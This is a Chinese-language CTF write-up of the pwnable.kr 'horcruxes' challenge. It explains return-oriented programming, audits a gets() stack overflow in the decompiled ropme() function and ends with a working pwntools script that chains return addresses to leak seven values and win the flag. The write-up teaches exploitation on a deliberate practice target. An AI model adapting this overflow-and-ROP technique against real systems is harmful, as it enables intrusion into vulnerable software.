---
title: horcruxes-pwnable.kr
visitors: 阅读量
copyright: true
date: 2019-10-03 19:19:24
tags:
- pwn
- pwnable.kr
- ROP
categories:
- pwn
password:
top:
---

# 前言

这题考的是ROP系统攻击。百度百科是这样介绍的：

> **简介**：ROP全称为Return-oriented Programming（面向返回的编程）。是一种基于代码复用的攻击技术，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。
>
> **内在特征**：1. ROP控制流中，call和ret指令不操纵函数，而是用于将函数里面的短指令序列的执行流串起来，但在正常的程序中，call和ret分别代表函数的开始和结束；2. ROP控制流中，jmp指令在不同的库函数甚至不同的库之间跳转，攻击者抽取的指令序列可能取自任意一个二进制文件的任意一个位置，这很不同于正常程序的执行。比如，函数中部提取出的jmp短指令序列，可将控制流转向其他函数的内部；而正常程序执行的时候，jmp指令通常在同一函数内部跳转。
>
> **防范措施**：ROP攻击的程序主要使用栈溢出的漏洞，实现程序控制流的劫持。因此栈溢出漏洞的防护是阻挡ROP攻击最根源性的方法。如果解决了栈溢出问题，ROP攻击将会在很大程度上受到抑制。

总结ROP就是主要利用栈溢出，操纵call、ret、jmp指令，实现程序控制流的劫持，跳转到任意一个位置。



# 题目

**ssh horcruxes@pwnable.kr -p2222 (pw:guest)**

题目只给了程序，没有给源码，那就放ida或gdb查看。程序保护只有NX（不能在栈上运行）

![](https://i.loli.net/2019/10/03/K3ujbGtC8qQdAa4.png)

readme里面主要是告诉我们，编译好的程序运行在机子的9032端口，运行用户是horcruxes-pwn。

本地运行需要安装32位libseccomp库：`apt-get install libseccomp-dev:i386`

# 审计

> 图中ida截图部分函数名被替换及注释

main函数里面有大量的seccomp函数，查了一下是linux的沙箱之类的，这里看不懂是什么操作就先略过。welcome_borad里面是输出提示语段；

![](https://i.loli.net/2019/10/03/x9CGUg53p7ANqD1.png)

重点来看看init_ABCDEFG()！首先从/dev/urandom里面读取4byte到buf。然后利用buf作为种子生成7个随机数，根据公式运算得到ABCDEFG的值。其中sum为7个数字之和。

![](https://i.loli.net/2019/10/03/tvHGlOeb53P7JCB.png)

初始化7个数后，main函数调用函数``ropme()``。函数伪C如下。

第一次（第8 9行）我们输入值与生成的7个数对比，如果相同则调用对应的函数。

```
int ropme()
{
  char s[100]; // [esp+4h] [ebp-74h]
  int v2; // [esp+68h] [ebp-10h]
  int fd; // [esp+6Ch] [ebp-Ch]

  printf("Select Menu:");
  __isoc99_scanf("%d", &v2);
  getchar();
  if ( v2 == a )
  {
    A();
  }
  else if ( v2 == b )
  {
    B();
  }
  else if ( v2 == c )
  {
    C();
  }
  else if ( v2 == d )
  {
    D();
  }
  else if ( v2 == e )
  {
    E();
  }
  else if ( v2 == f )
  {
    F();
  }
  else if ( v2 == g )
  {
    G();
  }
  else
  {
    printf("How many EXP did you earned? : ");
    gets(s);
    if ( atoi(s) == sum )
    {
      fd = open("flag", 0);
      s[read(fd, s, 0x64u)] = 0;
      puts(s);
      close(fd);
      exit(0);
    }
    puts("You'd better get more experience to kill Voldemort");
  }
  return 0;
}
```

这里我们审查``A()``函数，其余6个数大同小异。

![](https://i.loli.net/2019/10/03/i7Tj2ZqEocaIzXv.png)

当调用``A()``时，函数返回一段字符串，其中包含``a``的初始值。

我们在反观``ropme()``函数，我们第二次（第41行）的值，与sum对比（7个数之和），如果相同则打印出flag。



# 思路

在``ropme()``下的第41行``gets()``可以造成栈溢出，结合题目提示：这是一题rop攻击的例题。

## 思路一

利用``gets()``造成栈溢出覆盖``ropme()``返回地址，将地址覆盖为函数中的**第44行**，也就是flag。

程序只开启了NX，我们也不是利用shellcode，看上去是可行的。但是实测，无法返回到``ropme()``的任何一行。查看溢出覆盖后``ropme()``的返回地址为非预期地址。谷歌一圈发现是：

**``0xa``会被`gets`当作输入结束的信号(回车)，并且把``0xa``替换成``0x00``(\0)，最终导致没办法直接返回到``ropme()``函数中去。**

![img](https://i.imgur.com/bHiAxwe.png)

## 思路二

就是把生成的7个值都找出来求和一下就可以了。这里我一开始就踩了坑，看到``init_ABCDEFG()``在生成随机时，种子是从``/dev/urandom``中读取的，然后就天真认为每次生成的7个值都是一样的，实际上人家不是伪随机数QAQ。我们利用这个脚本，再次验证一样（虽然事实如此）：

```python
from pwn import *
context.log_level = 'debug'

payload = 'a'*120 + p32(0x809fe4b)

for _ in range(5):
	p = remote('pwnable.kr',9032)
	p.recvuntil('Select Menu:')
	p.sendline('1')
	p.recvuntil('earned? : ')
	p.sendline(payload)
	p.recvuntil('(EXP +')
	sleep(3)
```

也就是说我们需要一次性得到7个随机数。我们看下``A()``汇编代码：

![](https://i.loli.net/2019/10/04/qHD8UC5AkJL1yuR.png)

``A()``汇编中的``retn``相当于``pop eip、pop cs``，即``pop eip``之后，执行``eip``指向的指令。

我们是通过覆盖了``ropme()``的返回地址为``A()``。也就是说``A()``的返回地址则是``ropme()``返回地址+4。我们用一个图描述一下：

![](https://i.loli.net/2019/10/04/yK8AufbzHLX75Tl.png)

利用这一点，只用我们依次覆写7个函数的地址，就能自动读取到``EXP``。

那么现在的问题就变成了，如何返回到``ropme()``函数。前面我们已经得知了，因为``ropme()``内存地址特殊，无法跳转，但是``ropme()``是在``main()``函数中被调用过的，那么我们可以跳转到``main()``函数中的这一行。

# 脚本

```python
# coding:utf-8
# 不明原因需要多运行几次直到flag出来
from pwn import *
context.log_level = 'debug'

payload = 'a'*(0x74+4) # s到eip上距离
# ABCDEFG调用地址
payload += p32(0x809FE4B)+p32(0x809FE6A)+p32(0x809FE89)+p32(0x809FEA8)+p32(0x809FEC7)+p32(0x809FEE6)+p32(0x809FF05)
# ropme调用地址
payload += p32(0x0809FFFC)

p = remote('pwnable.kr',9032)
p.recvuntil('Select Menu:')
p.sendline('1')
p.recvuntil('earned? : ')
p.sendline(payload)

exp = 0
for _ in range(7):
    p.recvuntil('(EXP +')
    exp += int(p.recvline().replace(')',"").strip())
print exp

p.recvuntil('Select Menu:')
p.sendline('1')
p.recvuntil('earned? : ')
p.sendline(str(exp))
p.recv()
```

# 总结

* ROP通常利用栈溢出，操纵call、ret、jmp指令，实现程序控制流的劫持，跳转到任意一个位置。
* ``gets()``结束输入的标记是``0xa(回车)``，并将其替换为``\0``。



# 参考

[muirelle](<https://muirelle.com/2018/12/30/Pwnable-kr/>)

[pwnable.kr horcruxes ROP利用](<https://bbs.pediy.com/thread-249324.htm>)